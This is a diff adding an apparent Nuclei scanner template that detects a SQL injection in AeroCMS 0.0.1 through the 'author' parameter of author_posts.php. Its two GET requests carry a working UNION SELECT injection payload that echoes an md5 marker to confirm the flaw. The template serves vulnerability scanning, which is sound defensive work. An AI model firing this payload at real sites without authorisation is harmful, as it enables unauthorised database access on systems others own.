@@ -1,0 +1,42 @@
+id: aerocms-sqli
+
+info:
+  name: AeroCMS 0.0.1 - SQL Injection
+  author: shivampand3y
+  severity: critical
+  description: |
+    AeroCMS 0.0.1 contains a SQL injection vulnerability via the author parameter. An attacker can possibly obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.
+  reference:
+    - https://www.exploit-db.com/exploits/51022
+    - https://github.com/MegaTKC/AeroCMS/releases/tag/v0.0.1
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cwe-id: CWE-89
+  metadata:
+    verified: true
+    max-request: 2
+  tags: aero,cms,sqli,edb
+variables:
+  num: "999999999"
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1'
+      - '{{BaseURL}}/cms/author_posts.php?author=admin%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(md5({{num}}),1,1),NULL,NULL,NULL,NULL--%20-&p_id=1'
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{md5(num)}}'
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4b0a00483046022100c0d1fe5de33db069d794adfa4ceab1c60a1281c930a2e85d3c2a43759a3bcbd80221009a55e9e2ebe88b2c499c4f47cf340ad7e34ad31341d5c1f6354cea1b9375a421:922c64590222798bb761d5b6d8e72950
